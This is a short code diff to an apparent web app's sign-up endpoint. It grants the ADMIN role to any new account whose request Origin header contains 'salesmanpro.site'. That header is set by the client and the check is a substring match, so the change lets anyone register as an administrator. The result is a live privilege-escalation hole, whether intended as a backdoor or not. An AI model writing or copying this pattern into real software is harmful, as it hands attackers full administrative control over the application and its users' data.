@@ -23,6 +23,9 @@ export async function POST(req: Request) {
       );
     }
 
+    const origin = req.headers.get("origin") || "";
+    const isSalesmanPro = origin.includes("salesmanpro.site");
+
     const hashedPassword = await bcrypt.hash(password, 10);
 
     const newUser = await prisma.user.create({
@@ -30,6 +33,7 @@ export async function POST(req: Request) {
         name,
         email,
         password:hashedPassword,
+        role: isSalesmanPro ? "ADMIN" : "USER",
       },
     });
 
